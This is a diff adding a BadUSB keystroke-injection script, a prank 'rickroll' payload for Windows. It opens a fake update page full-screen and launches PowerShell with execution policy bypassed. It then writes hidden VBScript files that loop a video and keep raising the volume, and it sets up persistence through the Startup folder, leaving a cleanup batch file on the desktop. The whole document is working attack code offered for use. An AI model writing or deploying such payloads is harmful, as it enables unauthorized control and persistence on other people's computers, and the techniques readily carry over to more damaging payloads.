@@ -1,0 +1,23 @@
+REM Ultra-Fast Rickroll Stealth - Optimized Build
+DEFAULT_DELAY 50
+DELAY 800
+
+REM 1. Open distraction (faster)
+GUI r
+DELAY 300
+STRING https://fakeupdate.net/win10ue/
+ENTER
+DELAY 600
+F11
+DELAY 150
+
+REM 2. Launch PowerShell
+GUI r
+DELAY 200
+STRING powershell -NoProfile -ExecutionPolicy Bypass 
+ENTER
+DELAY 400
+
+REM 3. Single PowerShell execution block (no intermediate ENTERs)
+STRING $d="$env:LOCALAPPDATA\SysCache"; md $d -Force 2>$null; $a="$d\a.vbs"; $v="$d\v.vbs"; $s="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\BootSync.vbs"; $r=[Environment]::GetFolderPath('Desktop'); 'do:set w=CreateObject("WMPlayer.OCX"):w.URL="https://bit.ly/4blfCJQ":w.controls.play:while w.playState<>1:wscript.sleep 50:wend:w.close:wscript.sleep 200:loop' > $a; 'do:CreateObject("WScript.Shell").SendKeys(chr(175)):wscript.sleep 5000:loop' > $v; 'CreateObject("WScript.Shell").Run "wscript.exe //B """ + $a + """",0:CreateObject("WScript.Shell").Run "wscript.exe //B """ + $v + """",0' > $s; Start-Process wscript.exe -ArgumentList '//B',$a -WindowStyle Hidden; Start-Process wscript.exe -ArgumentList '//B',$v -WindowStyle Hidden; $b='@echo off' + [char]10 + 'taskkill /f /im wscript.exe >nul 2>&1' + [char]10 + 'del /f /q "' + $s + '" >nul 2>&1' + [char]10 + 'rd /s /q "' + $d + '" >nul 2>&1' + [char]10 + 'echo Cleanup complete. Rickroll terminated.' + [char]10 + 'pause' + [char]10 + 'del "%~f0"'; $b | Out-File "$r\EMERGENCY_STOP.bat" -Encoding ASCII; exit
+ENTER
